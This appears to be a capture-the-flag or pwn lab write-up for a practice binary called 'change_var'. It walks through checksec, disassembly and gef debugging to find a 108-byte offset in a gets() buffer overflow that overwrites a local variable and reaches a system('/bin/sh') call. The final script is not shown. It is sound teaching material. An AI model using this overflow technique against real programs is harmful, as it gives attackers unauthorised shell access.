# Binary


Binary is not stripped, which means deebugging symbols are present.

```r
change_var: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=d76dedac142fd59d34382356aa1868b642adffaa, not stripped
robin@oracle:~/Pwn/0x01$ 
```

# Checking security
n
Let's check security

```r
========================
gef➤  checksec
[+] checksec for '/home/robin/Pwn/0x01/change_var'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
gef➤  
==========================
```



Similar as of ret2win, we can't execute anything from stack.

# Reverse Engineering 

`Disassembling the main function`


```r
==================
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004005c7 <+0>:	push   rbp
   0x00000000004005c8 <+1>:	mov    rbp,rsp
   0x00000000004005cb <+4>:	sub    rsp,0x70
   0x00000000004005cf <+8>:	mov    DWORD PTR [rbp-0x4],0x31
   0x00000000004005d6 <+15>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004005d9 <+18>:	mov    esi,eax
   0x00000000004005db <+20>:	lea    rdi,[rip+0xe6]        # 0x4006c8
   0x00000000004005e2 <+27>:	mov    eax,0x0
   0x00000000004005e7 <+32>:	call   0x4004c0 <printf@plt>
   0x00000000004005ec <+37>:	lea    rax,[rbp-0x70]
   0x00000000004005f0 <+41>:	mov    rdi,rax
   0x00000000004005f3 <+44>:	mov    eax,0x0
   0x00000000004005f8 <+49>:	call   0x4004d0 <gets@plt>
   0x00000000004005fd <+54>:	cmp    DWORD PTR [rbp-0x4],0x32
   0x0000000000400601 <+58>:	jne    0x400622 <main+91>
   0x0000000000400603 <+60>:	lea    rdi,[rip+0xe6]        # 0x4006f0
   0x000000000040060a <+67>:	call   0x4004a0 <puts@plt>
   0x000000000040060f <+72>:	lea    rdi,[rip+0x102]        # 0x400718
   0x0000000000400616 <+79>:	mov    eax,0x0
   0x000000000040061b <+84>:	call   0x4004b0 <system@plt>
   0x0000000000400620 <+89>:	jmp    0x40062e <main+103>
   0x0000000000400622 <+91>:	lea    rdi,[rip+0xff]        # 0x400728
   0x0000000000400629 <+98>:	call   0x4004a0 <puts@plt>
   0x000000000040062e <+103>:	mov    eax,0x0
   0x0000000000400633 <+108>:	leave  
   0x0000000000400634 <+109>:	ret    
End of assembler dump.
gef➤  

=======================
```


It checks the value on line `   0x00000000004005fd <+54>:	cmp    DWORD PTR [rbp-0x4],0x32` and see if it's equals to `0x32` and checks if it's true, then it is equals to 0 on line `   0x0000000000400601 <+58>:	jne    0x400622 <main+91>
` then it jumps to 


```r
   0x0000000000400622 <+91>:	lea    rdi,[rip+0xff]        # 0x400728
   0x0000000000400629 <+98>:	call   0x4004a0 <puts@plt>
   0x000000000040062e <+103>:	mov    eax,0x0
   0x0000000000400633 <+108>:	leave  
   0x0000000000400634 <+109>:	ret    
```

which mocks you, LOL.

If it's equal to `0x32`:-

```r
   0x0000000000400603 <+60>:	lea    rdi,[rip+0xe6]        # 0x4006f0
   0x000000000040060a <+67>:	call   0x4004a0 <puts@plt>
   0x000000000040060f <+72>:	lea    rdi,[rip+0x102]        # 0x400718
   0x0000000000400616 <+79>:	mov    eax,0x0
   0x000000000040061b <+84>:	call   0x4004b0 <system@plt>
```

Then it spawns the `bin/sh`

# Exploitation



We put a breakpoint at `   0x00000000004005fd <+54>:	cmp    DWORD PTR [rbp-0x4],0x32`, to compare our input with the `0x32` which as `main + 54`.

```r
gef➤  b *main + 54
Breakpoint 1 at 0x4005fd
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
gef➤  
```

Then, let's run this:-

```r

gef➤  r
Starting program: /home/robin/Pwn/0x01/change_var 
I dare you to change the value 49
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdc80  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x0               
$rcx   : 0x00007ffff7dcfa00  →  0x00000000fbad2288
$rdx   : 0x00007ffff7dd18d0  →  0x0000000000000000
$rsp   : 0x00007fffffffdc80  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbp   : 0x00007fffffffdcf0  →  "oaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaaua[...]"
$rsi   : 0x0000000000602671  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"
$rdi   : 0x00007fffffffdc81  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"
$rip   : 0x00000000004005fd  →  <main+54> cmp DWORD PTR [rbp-0x4], 0x32
$r8    : 0x0000000000602739  →  0x0000000000000000
$r9    : 0x00007ffff7fd04c0  →  0x00007ffff7fd04c0  →  [loop detected]
$r10   : 0x0000000000602010  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x00000000004004e0  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffddd0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc80│+0x0000: "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"	 ← $rax, $rsp
0x00007fffffffdc88│+0x0008: "baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaaha[...]"
0x00007fffffffdc90│+0x0010: "caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaia[...]"
0x00007fffffffdc98│+0x0018: "daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"
0x00007fffffffdca0│+0x0020: "eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"
0x00007fffffffdca8│+0x0028: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
0x00007fffffffdcb0│+0x0030: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x00007fffffffdcb8│+0x0038: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaana[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005f0 <main+41>        mov    rdi, rax
     0x4005f3 <main+44>        mov    eax, 0x0
     0x4005f8 <main+49>        call   0x4004d0 <gets@plt>
 →   0x4005fd <main+54>        cmp    DWORD PTR [rbp-0x4], 0x32
     0x400601 <main+58>        jne    0x400622 <main+91>
     0x400603 <main+60>        lea    rdi, [rip+0xe6]        # 0x4006f0
     0x40060a <main+67>        call   0x4004a0 <puts@plt>
     0x40060f <main+72>        lea    rdi, [rip+0x102]        # 0x400718
     0x400616 <main+79>        mov    eax, 0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "change_var", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005fd → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004005fd in main ()
gef➤  x/s $rbp - 0x4
0x7fffffffdcec:	"aaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
gef➤  pattern search aaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Searching 'aaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
[+] Found at offset 108 (big-endian search) 
```


So, our input has offset at `108`, then now let's run the script. 



Done!




